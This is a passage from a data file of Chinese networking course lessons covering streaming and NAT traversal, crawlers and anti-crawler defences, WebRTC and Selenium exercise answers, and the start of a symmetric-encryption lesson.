IP，那么拉勾内部的主机可以找到这个客户，找到之后，双方建立连接。但是某位客户如果想主动发起向拉勾内网某台机器的连接，这其实是做不到的。</p>\n<p data-nodeid="665">像下图这种两个主机都在内网中，都需要 NAT 的场景，其实是无法通信的：</p>\n<p data-nodeid="666"><img src="https://s0.lgstatic.com/i/image6/M01/42/3F/Cgp9HWCwvJWANNfvAAN_FGm1rcM006.png" alt="Drawing 10.png" data-nodeid="753"></p>\n<p data-nodeid="667">上图这种情况，拉勾内网发起连接，对方的 NAT 路由会因为自己内网的机器没有发起过请求而拒绝；反之，如果客户发起请求，会被拉勾的 NAT 拒绝。这种情况类似于多线程中的“死锁”问题，无法解决。这个时候，就需要一台第三方服务器作为 NAT 模块的辅助功能，帮助双方的 NAT 模块设置本地数据，让双方的 NAT 模块都认为对方已经和自己发起过通信。这个解决方案也叫作<strong data-nodeid="759">NAT 穿透（NAT 穿墙）</strong>。</p>\n<p data-nodeid="668">举个例子：在著名的 WebRTC 协议中，可以提供网页版的在线 1 对 1 聊天，对于多数家庭到家庭的网络来说，是可以正常工作的。如果当你需要连接两个内网的机器，这个时候就需要自己架设第三方服务，或者使用某个收费的第三方服务。</p>\n<p data-nodeid="669">对于在线会议的场景，如果人数较少的情况下，仍然可以使用点到点技术，只不过传输量会随着人数的上升而呈爆发式增长。所以在人数较多的时候，就需要更多的优化策略。当然，其中一种方案就是放弃点到点技术，而直接采用类似直播架构的中心化服务。另一种策略就是利用边缘计算，让距离相近的参会者利用共同的离自己最近的服务器交换数据。</p>\n<h3 data-nodeid="670">总结</h3>\n<p data-nodeid="671">这一讲我们探讨了流媒体技术。流媒体，就是把多媒体数据抽象成为流进行传输。视频本质上是一张张图片在播放，因此非常适合流传输。要知道，流是随着时间产生的数据。通常在一个网络中，等价成本下吞吐量、丢包率和延迟 3 者不能兼得。也就是说，像直播这种吞吐量非常大的视频应用，可能就要牺牲延迟。比如之前 B 站直播没有优化前，用户看到的直播画面会比真实的时间会慢近半分钟。</p>\n<p data-nodeid="672">另一方面，像在线会议这类对延迟要求较高的场景，就可能需要降低视频质量，或者部署边缘服务。如果是内网视频会议，或者跨地区的公司视频会议，很容易找到边缘节点帮助交换数据和计算；如果是来自天南地北的用户，那么就需要投入更多成本。对于社交网站而言，需要维护几个人同时语音、视频聊天，因为人数较少，就可以使用点对点技术（但是要解决 NAT 穿墙的问题）。</p>\n<p data-nodeid="673"><strong data-nodeid="769">那么通过这一讲的学习，你现在可以尝试来回答本讲关联的面试题目：直播网站是如何实现的</strong>？</p>\n<p data-nodeid="674">【<strong data-nodeid="775">解析</strong>】一个直播网站通常会有下面 5 个部分组成。</p>\n<ol data-nodeid="675">\n<li data-nodeid="676">\n<p data-nodeid="677">录制端：负责录制直播视频，用流的形式上传。</p>\n</li>\n<li data-nodeid="678">\n<p data-nodeid="679">计算集群：专门负责编码上传的流数据，然后进行压缩、转码、切片等工作。</p>\n</li>\n<li data-nodeid="680">\n<p data-nodeid="681">对象存储：存储原始视频和转码后的视频（相当于 CDN 的源，回源用）。</p>\n</li>\n<li data-nodeid="682">\n<p data-nodeid="683">CDN：将转码后的内容分发到离用户较近的节点，方便用户获取。</p>\n</li>\n<li data-nodeid="684">\n<p data-nodeid="685">直播 App：给用户看直播时使用。</p>\n</li>\n</ol>\n<h3 data-nodeid="686">思考题</h3>\n<p data-nodeid="2998" class="te-preview-highlight">最后我再给你出一道需要查资料的思考题，写一张网页，用 WebRTC 实现点到点通信。</p>\n\n\n\n\n\n\n\n\n<p data-nodeid="688" class="">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《18 | 爬虫和反爬虫：如何防止黑产爬取我的数据？》，再见！</p>',
        article_title: "17 | 流媒体技术：直播网站是如何实现的？",
        title: "17 | 流媒体技术：直播网站是如何实现的？",
        id: 7284,
      },
      {
        content:
          '<p data-nodeid="481" class="">爬虫在当今的互联网中被大量地使用已经是约定俗成的潜规则，虽说内容的提供者都千方百计地防止自己的数据被竞品拿走，但是如果你去看一看某些百科中的文章和维基百科的相似程度，就知道很多不良的行为正在被默许着。</p>\n<p data-nodeid="482">记得早期一些购票网站起家的时候，就大量使用爬虫技术爬取航空公司的数据，为了不让航空公司屏蔽，特意用了很多个人电脑做爬虫端，让航空公司无法分清哪些是爬虫、哪些是用户。这样，用户订票的时候，客服经理就有足够的票务数据提供给用户。</p>\n<p data-nodeid="483">另外，一些相互竞争的电商、外卖公司，内部甚至会设立专门的数据爬取小组，用于监控竞品的数据，并且实时地调整业务的竞争策略——如补贴、签约等。还有一些爬虫的黑产利用招聘网站的漏洞，爬取并出售简历数据。对一个 HR 而言，花几千块钱的年费，才可以看上万份简历。而一个黑产，只需要多购买几个这样的账号，就可以从招聘网站中拿走大量的数据，再销售给不法分子，一年获得上千万的利润。</p>\n<p data-nodeid="484">因此，这一讲我们就聊一聊这个的话题——<strong data-nodeid="538">如何防止黑产爬取我的数据</strong>，以此加深你对数据安全的重视。</p>\n<h3 data-nodeid="485">爬取数据违法吗？</h3>\n<p data-nodeid="486">首先，爬取一个网站的数据，很可能是违法行为。通常一个网站，会在自己根路径下的 robots.txt 中定义自己网页中哪些数据是可以用来爬取的。从理论上讲，如果你想爬取一个网站的数据，应该先获取它根目录下的 robots.txt 文件，查阅文件内容，看自己要爬取的数据是否被允许。</p>\n<p data-nodeid="487">下面是 bilibili 的 robots.txt 的内容：</p>\n<pre class="lang-java" data-nodeid="488"><code data-language="java">User-agent: Yisouspider\nAllow: /\nUser-agent: Applebot\nAllow: /\nUser-agent: bingbot\nAllow: /\nUser-agent: Sogou inst spider\nAllow: /\nUser-agent: Sogou web spider\nAllow: /\nUser-agent: <span class="hljs-number">360</span>Spider\nAllow: /\nUser-agent: Googlebot\nAllow: /\nUser-agent: Baiduspider\nAllow: /\nUser-agent: Bytespider\nAllow: /\nUser-agent: PetalBot\nAllow: /\nUser-agent: *\nDisallow: /\n</code></pre>\n<p data-nodeid="489">可以看到，如果你是谷歌、苹果、360、百度等搜索引擎，那么 B 站是欢迎你爬取内容的。如果你是其他的个人或者组织，比如说你想爬取 B 站上所有大 V 的数据，然后将分析结果出售给其他人（比如某个 MCN 平台），实际上是触犯法律的。依据我国的刑法，你可能会被判处非法获取计算机信息系统数据罪，情节严重的可能会被判处 3 年以上的有期徒刑并处罚金。</p>\n<p data-nodeid="490">我之所以说这件事情，是希望你对网络信息安全有清晰的认识。互联网不是法外之地，做任何事情之前都请三思而行。</p>\n<h4 data-nodeid="491">助点机器人</h4>\n<p data-nodeid="492">在没有允许的情况下爬取对方的数据是违法行为。但是这里衍生出一个问题，比如说，你是一个拉勾的付费用户，你觉得拉勾的界面不够智能，于是你自己写了一个程序，只针对自己的账号范围实现某个功能，对拉勾的简历进行筛选，从而找到合适的求职者，这是违法行为吗？</p>\n<p data-nodeid="493">这个行为不是违法行为。这个行为可以归结成你自己做的一个辅助自己工作的机器人，但是如果你将这个工具提供给其他人，这是违法行为吗？其实也不是违法行为。但是如果其他人将这个工具用作黑产，比如说爬取用户的数据然后进行简历信息的买卖，这就构成了违法行为，构成犯罪的是买卖简历信息。如果你是拉勾的竞品，你使用大量账号这样做，还会构成非法竞争。</p>\n<p data-nodeid="494">换一个例子，有人觉得 Github 不够智能，然后做了一个插件，帮助大家浏览 Github 中文件代码的目录树，本质上这个工具也需要用到爬虫的部分技术——需要爬取这个目录树。但这不是违法行为，但若有人利用类似的工具，将 Github 全部代码都拿走，在淘宝上打包售卖，这就是违法行为了。</p>\n<h3 data-nodeid="495">爬虫的原理</h3>\n<p data-nodeid="496">讨论完法律，我们讨论下爬虫是怎么实现的。爬虫的原理非常简单，本质上就是一次网络请求，然后将返回的数据保存下来。</p>\n<p data-nodeid="497">对于搜索引擎的爬虫而言，通常会在请求头中加上自己的标识，比如百度会加上 baidu 字符串，这样方便网站服务器识别。</p>\n<p data-nodeid="1327" class="">爬虫如果是非法的，往往就需要伪装成浏览器。通常会用到浏览器内核去模拟发出网络请求，比如用 Chromium（Chrome 的开源内核）就可以提供这样的能力。</p>\n\n\n\n\n<p data-nodeid="2295" class="">当你用 Chromium 发起请求的时候，对于服务提供方的反爬虫系统，你的请求就变成了一次标准的用户行为。如果对方网站需要登录才能爬取数据，这个时候，不法分子还会模拟登陆行为。如果仅仅是输入用户名和密码，那这个网站登录行为会非常容易模拟，只需要找到对方对应的接口，把用户名和密码传过去，就可以拿到访问资源的令牌。这就是大部分网站登录时需要你用手机验证码登录、微信扫描、或填写图片验证码的原因。</p>\n\n\n\n\n<p data-nodeid="500">对于一些获取数据还需要付费的网站，比如说视频网站或拉勾这样的招聘网站，用户需要付费才能获取核心的数据，这个时候不法分子可能会购买大量的账号。为了防止不法分子获得大量的账号，现在国家已经在严打销售手机卡号的行为。所以请你记住，使用其他人的身份去注册账号，这也是一种违法行为。</p>\n<h4 data-nodeid="501">关于验证码</h4>\n<p data-nodeid="502">当被爬取的网站登录接口有验证码时，爬虫的设计者通常会有两种手段。一种是破解验证码，在现在这个人工智能的时代，想要破解验证码只需要获得足够多的验证码图片样本，然后用 tensorflow 分析一下，基本上都可以做到一定的识别率，可以高于 80% 以上。所以现在的网站往往不会使用简单的图片验证码，比如说要拖动一个滑块、选中几张图片、算一道数学题等来增加破解成本。我见过最变态的网站验证码是一道化学题，我花了两个小时才注册成功。</p>\n<p data-nodeid="503">所以你的网站如果还在使用普通的图形验证码，而你网站被攻克的代价也很高的话，请你务必早点更换验证码——更换成更难破解的，甚至多种验证码的混合。</p>\n<h4 data-nodeid="504">模拟用户动作</h4>\n<p data-nodeid="505">对于一个爬取数据用的浏览器内核，往往还提供了模拟用户行为的功能。比如说点击按钮，滚动一下页面，输入一行文字。所以千万不要觉得，爬虫模拟不了这些用户行为，对于爬虫的设计者，这些都是基础操作。</p>\n<h4 data-nodeid="506">数据的提取</h4>\n<p data-nodeid="507">当数据被下载下来之后，爬虫会尝试将原始数据存储，然后再进行离线分析。当然有的爬虫爬取了数据之后就马上进行分析。如果要爬取网页数据，后续会用到 HTML 的解析器（Parser），这个在 Github上 可以找到很多的开源实现。如果是爬取的接口数据，通常就是分析 Json。有的网页数据是由 JavaScript 渲染的，这种网页，通常爬虫会模拟浏览器的行为，在页面加载完成几秒之后才开始下载网页内容。</p>\n<h4 data-nodeid="508">反追踪</h4>\n<p data-nodeid="509">对于黑产的爬虫，还会进行 IP 的反追踪。所谓 IP 的反追踪，就是利用代理，增加追踪的成本。比如黑客在从事犯罪活动时通过多次代理，跨了多个国家，那么一个国家的警方力量就很难追踪到他。在爬虫领域有很多人会购买 IP 代理，比如说一个非法的去 B 站收集统计数据的爬虫，为了防止 B 站的追诉以及防止 B 站安全策略的屏蔽，可能会购买大量的 IP，然后模拟成几百个用户在使用 B 站。你要注意，临时租用大量 IP 地址的价格低廉，这也大大降低了犯罪的成本。</p>\n<h3 data-nodeid="510">反爬虫</h3>\n<p data-nodeid="511">接下来，我们说说有关反爬虫的一些基本的操作。</p>\n<h4 data-nodeid="512">robots.txt</h4>\n<p data-nodeid="513"><strong data-nodeid="570">在反爬虫的时候，第一步我们要先从法律上告诉爬虫哪些页面是不可以爬取的</strong>。所以我们要先写好自己的 robots.txt，并放到网站的根目录。</p>\n<h4 data-nodeid="514">用户的识别</h4>\n<p data-nodeid="515">接下来我们对于高频访问的 IP 要予以关注。当然，仅仅通过 IP 来判断是不可取的。因为有的时候一家公司会共用一个 IP 出口地址。举个例子：一家猎头公司下面的几百个猎头，可能会每天疯狂的使用拉勾，因此从拉勾的数据上，你会看到大量的重复 IP 访问。这个时候我问你个问题，你禁不禁用这些 IP？当然不能禁用，这些都是付费用户。</p>\n<p data-nodeid="516">那么这个时候有一件非常值得做的事情，就是使用设备的指纹。对于一个设备，它的 CPU 数量、CPU 序列号、屏幕的分辨率、手机的厂商等，通常是固定的。这样可以结合 IP 地址做精细去重。这项技术被称为<strong data-nodeid="578">设备指纹</strong>，就是利用设备上的信息，生成一个具有唯一性的字符串，因为这种生成算法是非标准化的，因此不同的数据安全团队会有自己的算法。</p>\n<p data-nodeid="517">有了对用户的识别，就可以根据唯一用户设置数据安全策略，比如访问频次、黑名单等。</p>\n<h4 data-nodeid="518">字体加密</h4>\n<p data-nodeid="519">再介绍一种方法是<strong data-nodeid="586">自己实现字符编码和字体文件，增加爬虫爬取数据的成本</strong>。</p>\n<p data-nodeid="520">爬虫爬取的通常就是用户本身可以看到的内容。如果自己实现一套自己的字符编码。比如将 UTF8 编码中的汉字打乱顺序，然后再将字体文件中对应的数据换序，得到字体文件。显示简历的时候，使用自己根据这个字符集生成的字体文件。</p>\n<p data-nodeid="521">这样，爬虫下载到网页数据后，中文会乱码，这是因为爬虫无法理解我们创造的非标准字符集编码。当用户看到网页的时候，可以看到正确的内容，这是因为字体文件起了作用。即便爬虫将字体文件打开，和编码对应上，也是非常复杂的一个体力劳动。然后我们每天更换一次顺序，就可以给黑产增加相当大的爬取成本。</p>\n<h4 data-nodeid="522">加密传输</h4>\n<p data-nodeid="523">对于移动端 App 中的数据，如果可以加密传输，也能大大增加爬取成本。因为 App 不是浏览器，想要模拟一个 App 是非常困难的。那么 App 的数据抓取就依赖于 App 数据传输使用的标准协议，比如一个用 HTTPS 协议传输数据的 App，爬虫可以在 App 端安装证书，然后再利用代理实现中间人抓包。但如果数据用自己的协议加密，那么爬虫抓包的同时，还必须能够破解这个加密协议。</p>\n<h3 data-nodeid="524">总结</h3>\n<p data-nodeid="525">非法爬取数据是不可能完全杜绝的，我们只能提高非法爬取数据的成本。但是一定要有数据安全的意识。在互联网的世界里，数据是第一生产力，也是生命线。在完成开发工作之余，利用自己的专业知识适当提高爬取数据的成本是非常有必要的。</p>\n<p data-nodeid="526" class=""><strong data-nodeid="597">如果自己被公司要求写一个爬虫爬取竞品数据，请你先阅读下竞品的 robots.txt 文件，看看允不允许你这样做</strong>。如果这是一个违法行为，那么也可以适当提醒下有这样想法的决策者。 国家对网络信息安全犯罪的打击，只会越来越严。爬取数据看似简单，其实做到毫无证据保留是很难的。当然，利用爬虫技术，让自己在使用互联网产品的时候，可以消耗更少的时间，属于辅助机器人，这个是法律允许的。比如我就用爬虫技术监控拉勾教育中我自己专栏的订阅情况，当有同学订阅的时候我会收到邮件。</p>\n<h3 data-nodeid="527">思考题</h3>\n<p data-nodeid="528">最后再给你提一个问题：用最熟悉的语言写一段程序，模拟成浏览器访问拉勾教育的首页获取首页数据。</p>\n<p data-nodeid="529" class="">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是《模块四思考题解答》，希望你自己完成题目后再来看答案和分析。再见！</p>',
        article_title: "18 | 爬虫和反爬虫：如何防止黑产爬取我的数据？",
        title: "18 | 爬虫和反爬虫：如何防止黑产爬取我的数据？",
        id: 7285,
      },
      {
        content:
          '<p data-nodeid="25826" class="">今天我会带你把《<strong data-nodeid="25832">模块四：Web 技术</strong>》中涉及的课后练习题，逐一讲解，并给出每个课时练习题的解题思路和答案。</p>\n\n<h3 data-nodeid="25112">练习题详解</h3>\n<h4 data-nodeid="25113">15 | 内容分发网络：请简述 CDN 回源如何工作？</h4>\n<p data-nodeid="25114">【<strong data-nodeid="25168">问题</strong>】如果你的应用需要智能 DNS 服务，你将如何实现？</p>\n<p data-nodeid="25115">【<strong data-nodeid="25174">解析</strong>】首先你可以在你的域名解析系统中增加两条（或以上）ns 记录。比如说你的域名是 example.com，那么你可以增加 ns1.exmaple.com, ns2.example.com。当然，指定这两个域名的 IP 还需要配置两个 A 记录。</p>\n<p data-nodeid="25116">然后你需要两台机器（也可以是容器或者虚拟机），对应 ns1 和 ns2。最好用不在同一个物理机上的两个容器，这样可以避免一台物理机故障导致服务瘫痪。然后在每个容器（虚拟机）上安装一个 Named 服务。Named 是一个专门用来提供 DNS 服务的工具，在虚拟机上安装完成 Named 后，这个虚拟机就变成了一个权威服务器节点。</p>\n<p data-nodeid="25117">配置好 Named 后，你需要写几个脚本文件，给要提供 DNS 的域名配置信息。Named 配套使用的有个叫作 GeoDNS 的插件，可以提供基于地理位置的智能 DNS 服务。</p>\n<p data-nodeid="25118">更具体的操作，你可以参考这篇文档：<a href="https://bind9.readthedocs.io/en/latest/configuration.html?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="25180">https://bind9.readthedocs.io/en/latest/configuration.html</a>。</p>\n<h4 data-nodeid="25119">17 | HTTP 协议面试通关：强制缓存和协商缓存的区别是？</h4>\n<p data-nodeid="25120">【<strong data-nodeid="25188">问题</strong>】写一张网页，用 WebRTC 实现点到点通信。</p>\n<p data-nodeid="26111">【<strong data-nodeid="26122">解析</strong>】这里我为你找到了一份 Github 上的源代码：<a href="https://github.com/ScaleDrone/webrtc/blob/master/script.js?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="26120">https://github.com/ScaleDrone/webrtc/blob/master/</a>。</p>\n<p data-nodeid="26112" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M01/43/52/Cgp9HWC4nISASrfFAAEwZ4EyOXU323.png" alt="image (5).png" data-nodeid="26129"></p>\n\n<p data-nodeid="25122">在 WebRTC 的网络世界中，视频传输可以走点到点服务。客户端被称作 Peer，Peer 的数据直接传送给另一个 Peer，我们也称作<strong data-nodeid="25208">P2P 网络</strong>。在<strong data-nodeid="25209">P2P 网络中，要解决 NAT 穿墙问题，WebRTC 设计了一个网络的抽象框架被称作交互式网络建立连接（Interactive Connectivity Establishment， ICE）</strong>，图中的 STUN 是 ICE 的一个实现。</p>\n<p data-nodeid="25123">对于一个 P2P 网络中的 Peer，它每次要接入这个 P2P 网络会获得一个身份，这个身份就包括它的 IP 地址、端口使用的协议等，这个身份被抽象成了一个对象——Candidate（候选人）。当候选人创建一个 P2P 连接的时候，它会获得候选人的身份。但这个时候，它还没有发起任何真实的数据连接。此时它必须知道另一个人的身份，才能够进行通信。</p>\n<p data-nodeid="25124"><strong data-nodeid="25215">P2P 网络本身不具备传输身份的能力，因此这个时候需要另一个第三方网络提供身份的交换</strong>。代码中的这个第三方服务就是 ScaleDrone。当用户加入聊天室，会先创建连接：</p>\n<pre class="lang-java" data-nodeid="25125"><code data-language="java">pc = <span class="hljs-keyword">new</span> RTCPeerConnection(...)\n</code></pre>\n<p data-nodeid="25126">接下来会触发<code data-backticks="1" data-nodeid="25217">onicecanddiate</code>事件获得候选人（Candidate）身份：</p>\n<pre class="lang-java" data-nodeid="25127"><code data-language="java">pc.onicecandidate = event =&gt; {\n   <span class="hljs-keyword">if</span> (event.candidate) {\n     <span class="hljs-comment">// 通过ScaleDrone分发身份</span>\n   }\n };\n</code></pre>\n<p data-nodeid="25128">在实际的代码操作中，代码将获得的身份（event.candiate）直接发送到了 ScaleDrone 提供的某个聊天室中去，这样聊天室的其他用户就会拿到这个身份。</p>\n<p data-nodeid="25129">当有新用户进入聊天室后，ScaleDrone 会广播新用户的身份：</p>\n<pre class="lang-java" data-nodeid="25130"><code data-language="java">  room.on(<span class="hljs-string">\'data\'</span>, (message, client) =&gt; {\n   <span class="hljs-comment">// Message was sent by us</span>\n   <span class="hljs-keyword">if</span> (client.id === drone.clientId) {\n     <span class="hljs-keyword">return</span>;\n   }\n   <span class="hljs-keyword">if</span> (message.sdp) {\n     <span class="hljs-comment">// This is called after receiving an offer or answer from another peer</span>\n     pc.setRemoteDescription(<span class="hljs-keyword">new</span> RTCSessionDescription(message.sdp), () =&gt; {\n       <span class="hljs-comment">// When receiving an offer lets answer it</span>\n       <span class="hljs-keyword">if</span> (pc.remoteDescription.type === <span class="hljs-string">\'offer\'</span>) {\n         pc.createAnswer().then(localDescCreated).<span class="hljs-keyword">catch</span>(onError);\n       }\n     }, onError);\n   } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.candidate) {\n     <span class="hljs-comment">// Add the new ICE candidate to our connections remote description</span>\n     pc.addIceCandidate(\n       <span class="hljs-keyword">new</span> RTCIceCandidate(message.candidate), onSuccess, onError\n     );\n   }\n });\n</code></pre>\n<p data-nodeid="25131">这个时候，用户彼此都会将对方加入自己的候选人列表：</p>\n<pre class="lang-java" data-nodeid="25132"><code data-language="java"> pc.addIceCandidate(\n   <span class="hljs-keyword">new</span> RTCIceCandidate(message.candidate), onSuccess, onError\n )\n</code></pre>\n<p data-nodeid="25133">加入之后，如果远程候选人录制了视频，WebRTC 的 ontract 事件就会收到视频的数据流，也就是下面这段程序：</p>\n<pre class="lang-java" data-nodeid="25134"><code data-language="java"> pc.ontrack = event =&gt; {\n   <span class="hljs-keyword">const</span> stream = event.streams[<span class="hljs-number">0</span>];\n   <span class="hljs-keyword">if</span> (!remoteVideo.srcObject || remoteVideo.srcObject.id !== stream.id) {\n     remoteVideo.srcObject = stream;\n   }\n };\n</code></pre>\n<p data-nodeid="25135">这份代码的优势是不需要提供中转的流媒体服务器，就可以完成点到点的视频通信。同理，如果是多人视频，也可以用同样的方法实现。这段程序中需要两个第三方的服务：</p>\n<ol data-nodeid="25136">\n<li data-nodeid="25137">\n<p data-nodeid="25138">基于 ICE 标准提供 P2P 网络的服务（提供 NAT 穿透能力），这个可以使用 STUN；</p>\n</li>\n<li data-nodeid="25139">\n<p data-nodeid="25140">第三方聊天室服务，用于实现聊天的具体逻辑和交换身份。</p>\n</li>\n</ol>\n<h4 data-nodeid="25141">18 | 爬虫和反爬虫：如何防止黑产爬取我的数据？</h4>\n<p data-nodeid="25142">【<strong data-nodeid="25232">问题</strong>】用最熟悉的语言写一段程序，模拟成浏览器访问拉勾教育的首页获取首页数据。</p>\n<p data-nodeid="25143">【<strong data-nodeid="25242">解析</strong>】<strong data-nodeid="25243">我这里推荐用 selenium+py 解决这个问题</strong>。Selenium 是一个用于自动化测试框架。我这里会用到 Selenium 的 WebDriver，这个 WebDriver 支持多款浏览器，比如 Chrome、Safari 等。具体来说，可以用下面的程序引入 selenium 和选择要使用的 WebDriver：</p>\n<pre class="lang-java" data-nodeid="25144"><code data-language="java">from selenium <span class="hljs-keyword">import</span> webdriver\ndriver = webdriver.Chrome()\n</code></pre>\n<p data-nodeid="25145">我这里选择了 Chrome，然后我们就可以模拟浏览器发送请求了：</p>\n<pre class="lang-java" data-nodeid="25146"><code data-language="java">driver.get(<span class="hljs-string">"https://edu.lagou.com"</span>)\n</code></pre>\n<h3 data-nodeid="25147">总结</h3>\n<p data-nodeid="25148">这一模块我们学习了和 Web 技术相关的内容。<strong data-nodeid="25251">在实际工作中，配置 DNS 往往是 Leader 的职责</strong>。</p>\n<p data-nodeid="25149">作为 Leader 要关注域名、资源的 URL 的命名是否合理，方便记忆；要配置好 CDN 防止有资源直接从源站被获取；要部署好智能 DNS 实现负载均衡；在网站域名发生变更的时候，还要考虑到老域名如何迁移新域名。另一方面，对 HTTP 协议作为 Web 技术的核心，Leader 还要关注它的性能优化连接、资源大小、缓存等，这样才能更好地制作用户体验。</p>\n<p data-nodeid="25150">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《19 | 网络安全概述：对称、非对称加密的区别是？》，再见！</p>',
        article_title: "加餐 | 模块四思考题解答",
        title: "加餐 | 模块四思考题解答",
        id: 7286,
      },
    ],
  },
  {
    chapterTitle: "模块五：网络安全",
    children: [
      {
        content:
          '<p data-nodeid="1">在我们平时生活当中，两个人有不想让第三者知道的事情，可以找一个私密的空间去聊。而互联网本身是一个开放的体系，双方在交换数据的时候会经历大量的第三者——公司的防火墙、ISP 的路由器，还有可能有黑客抓取数据。那么这个时候如果张三和李四有私密的话想聊，该怎么办呢？当然是<strong data-nodeid="88">加密传输</strong>，想办法让双发传输的数据只有双方才能理解。</p>\n<p data-nodeid="2"><strong data-nodeid="93">目前有两种主流的加密方式——对称加密和非对称加密</strong>，这一讲我们就来聊聊这两种加密方式。</p>\n<h3 data-nodeid="3">对称加密</h3>\n<p data-nodeid="4">中国古代有藏头诗，比如“拉君时一登，勾芒司节令，教俗养鸡豚，育德德何成”，藏的头就是拉勾教育。如果张三把这首诗通过互联网发送给李四，那么其实张三在和李四说“拉勾教育”。张三把“拉勾教育”写成藏头诗，李四破解藏头诗还原内容，前者叫作<strong data-nodeid="104">数据的加密</strong>，后者叫作<strong data-nodeid="105">解密</strong>。</p>\n<p data-nodeid="5">但是上面并不是一种很好的加密方式。一方面藏头诗要作诗，诗要押韵，这个消耗计算资源。另一方面，藏头诗数据传输效率太低，5 个字才对应一个字，不可取。还有就是藏头诗太容易被破解，假设已知是藏头诗，那么只需要提取每句的第一个字就好了。</p>\n<h4 data-nodeid="6">最简单的加密算法</h4>\n<p data-nodeid="7">因此，<strong data-nodeid="113">在实际的操作中我们会使用更简单直接的方式计算加密，比如交换和取补操作就是很不错的选择</strong>。假设你要加密数字 1234，假设 x 的补是 10-x，那么取补就是得到 9876。单单看这个操作太容易被破解，这个时候我们将操作复杂化。假设有 3 种取补操作：</p>\n<ul data-nodeid="8">\n<li data-nodeid="9">\n<p data-nodeid="10">前两个数字取补，后两个不变得到：9834。记作 1 号方案；</p>\n</li>\n<li data-nodeid="11">\n<p data-nodeid="12">后两个数字取补，前两个不变，得到：1276。记作 2 号方案；</p>\n</li>\n<li data-nodeid="13">\n<p data-nodeid="14">全部取补，得到：9876，记作3 号方案。</p>\n</li>\n</ul>\n<p data-nodeid="15">然后我们再增加两种换序操作，以 1234 为例：</p>\n<ul data-nodeid="16">\n<li data-nodeid="17">\n<p data-nodeid="18">相邻数字交换，得到 2143， 记作4 号方案；</p>\n</li>\n<li data-nodeid="19">\n<p data-nodeid="20">数据对半交换，得到 3412，记作5 号方案。</p>\n</li>\n</ul>\n<p data-nodeid="21">这样，我们可以设计一个加密过程是这样的，取补和换序操作交替进行，一共进行 4 次。那么如果是 1-4-2-5 就代表一种加密顺序，以 1234 为例：</p>\n<ul data-nodeid="22">\n<li data-nodeid="23">\n<p data-nodeid="24">前两个数字取补，得到 9834；</p>\n</li>\n<li data-nodeid="25">\n<p data-nodeid="26">相邻数据交换，得到 8943；</p>\n</li>\n<li data-nodeid="27">\n<p data-nodeid="28">后两个数字取补，得到 8967；</p>\n</li>\n<li data-nodeid="29">\n<p data-nodeid="30">数据对半交换得到：6789。</p>\n</li>\n</ul>\n<p data-nodeid="31">于是 1234 被加密成了 6789。解密的时候，需要知道加密的顺序 1-4-2-5。那么解密的时候就逆着上述操作即可：</p>\n<ul data-nodeid="32">\n<li data-nodeid="33">\n<p data-nodeid="34">数据对半交换得到：8967；</p>\n</li>\n<li data-nodeid="35">\n<p data-nodeid="36">后两个数字取补：8943；</p>\n</li>\n<li data-nodeid="37">\n<p data-nodeid="38">相邻数据交换：9834；</p>\n</li>\n<li data-nodeid="39">\n<p data-nodeid="40">前两个数字取补：1234。</p>\n</li>\n</ul>\n<p data-nodeid="41">在上面的过程中，对 5 种加密方案的定义、以及约定进行 4 次交替取补、换序操作，我们称为“<strong data-nodeid="139">加密算法</strong>”。1-4-2-5 ，描述的是在过程中的具体方案，是<strong data-nodeid="140">密钥</strong>。</p>\n<h4 data-nodeid="42">对称加密</h4>\n<p data-nodeid="43">在上面过程中，加密方用 1-4-2-5 加密，解密方用相同的密钥解密——解密方知道加密过程是 1425 就可以解密。像这样，双方加密解密都用相同密钥的算法，我们称为<strong data-nodeid="147">对称加密算法</strong>。</p>\n<p data-nodeid="44"><strong data-nodeid="152">在实际的操作过程当中，因为都是针对二进制的操作，取补操作可以用异或操作来替代。另外，在其中的某些步骤还可以拿数据和密钥进行位计算，具体不同加密算法实现不同</strong>。</p>\n<h4 data-nodeid="45">数据加密标准（DES）</h4>\n<p data-nodeid="46">数据加密标准（DES）算法在 1976 年被美国国家标准局定为使用标准，后来被广泛传播。目前已经被证明可以被暴力破解。所谓暴力破解，就是遍历所有可能的密钥解析数据的方法。举个例子，已知张三和李四传输的是中文，加密算法是 DES，那么拿出一小段数据进行暴力破解，尝试所有的密钥，如果能成功解析出中文词语（词语在词库中可以查到），那么说明破解成功。</p>\n<p data-nodeid="47">DES 采用的 56 位密钥，每次计算加密 64 位的数据。在实际的暴力破解过程中，比我上面描述的行为更加复杂。一个通用的暴力破解算法需要较大的算力，一些 DES 的破解算法需要 2<sup>39</sup>-2<sup>41</sup> 次操作。这个数量级的操作，目前还没有超出人类计算能力的极限，如果显卡好一点，或者机器多一些还是可以承受的。</p>\n<p data-nodeid="48">因此后续很多组织开始利用 3 次 DES 操作来增加破解成本，具体的做法是用 3 个 56 位的密钥组合成一个 168 位的密钥，对数据进行 3 次 DES 操作，这样做大大增加了暴力破解的成本。但是目前针对 3DES 仍然有一些攻击策略，需要 2<sup>90</sup> 次计算和 2<sup>88</sup> 位内存，虽然有一定概率被攻破，但是成本非常高。</p>\n<h4 data-nodeid="49">高级加密标准</h4>\n<p data-nodeid="50">为了应对暴力破解等问题，很多团队选择对称加密算法时开始使用高级加密标准（AES），这个加密法用 128 位密钥，并设计了更难破解的算法。具体我不展开了，如果你在项目中需要使用对称加密，你可以用这个算法。</p>\n<h4 data-nodeid="51">对称加密的缺陷</h4>\n<p data-nodeid="52">使用对称加密双方都知道密钥和算法，会造成很多问题。</p>\n<p data-nodeid="53">你可以先这样思考：如果你是一个网站提供服务给用户，你和用户之间如果使用对称加密，那么你需要为每个用户定时生成一个不同的密钥。这是因为，如果所有用户都用一个密钥，那么理论上一个用户就可以看到其他用户和网站之间的通信。有同学会问：以现在的技术给不同的客户端生成一个密钥难道有什么难度吗？ 比如一个 UV 在 1000W 的网站，如果每天需要给每个用户生成一次密钥也就是 1000W 次计算，按照现在集群的能力，别说一天，每秒做到生成 1000W 个密钥又有什么难度呢？因此，我们还需要进一步思考对称加密的问题。</p>\n<p 